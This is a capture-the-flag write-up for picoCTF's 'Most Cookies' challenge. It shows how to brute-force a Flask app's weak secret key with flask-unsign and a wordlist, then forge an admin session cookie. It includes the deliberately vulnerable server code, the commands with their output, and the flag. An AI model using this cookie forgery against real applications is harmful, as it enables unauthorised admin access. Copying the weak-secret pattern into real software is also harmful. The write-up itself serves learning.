# Most Cookies

## Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/) (view server.py reference at the end of page)

## Hint(s)

1. How secure is a flask cookie?

## Writeup 
I Started by looking at the source code

```python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```
I didn't know much about flask cookies but this part indicated that a secret key was used to generate the cookie
```python
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```
The code was confusing at first, but analyzing it more we can see that we have to become admin in order to get the flag. How do we do that?

First i did some research on flask cookies work. They use a secret key (as we can in the source code) to encrypt the cookie. In order to be able to change the cookie we have to find what secret key was used and then we can create our own payload.

I started by decoding the cookie. At first i used base64 which worked but gave me some unreadable characters at the end and got me basically nowhere.

After doing some more research, i came accross flask-unsign and realized that its the best tool to use for this challenge. 

You can install flask-unsign using : 
```
 $ pip3 install flask-unsign[wordlist]
 ```
First, we can get the flask cookie and decode it with : 
```
$ flask-unsign --decode --server http://mercury.picoctf.net:65344/
```
Which returns:
```
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YsAYmQ.qReaqo1ZSnYrCyHkO8GWelrg2bI
{'very_auth': 'blank'}
```
Refering back to the code, we can see that to become admin we have to modify the cookie to admin, but that requires a secret key. Then we remember that in the source code, the secret key was chosen randomly from a list of words. 

flask-unsign has an option which allows you to bruteforce cookies with a worldlist in order to find the secret key, exactly what we're looking for!

I then took the words from the source code, put them in a .txt file and bruteforced the cookie using this command : 
```
$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YsAYmQ.qReaqo1ZSnYrCyHkO8GWelrg2bI" --wordlist wordlist.txt
```
We get: 
```
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attempts
'fortune'
```
And we have the secret key!
Now all we need to do is create our own cookie to get the flag.
We do this by using :
```
$ flask-unsign --sign --secret fortune --cookie "{'very_auth': 'admin'}" 
```
This returns : 
```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YsAZzg.vtCG7cliX5WhpIoqQJKpXXeLSqI
```
We're pretty much finished! 
All we have to do now is go to the URL and change the session cookie to our forged one.

**note** : flask cookies are by default named "session".

And then we get the flag : **picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}**

## References  
## server.py

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```

### wordlist.txt

```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```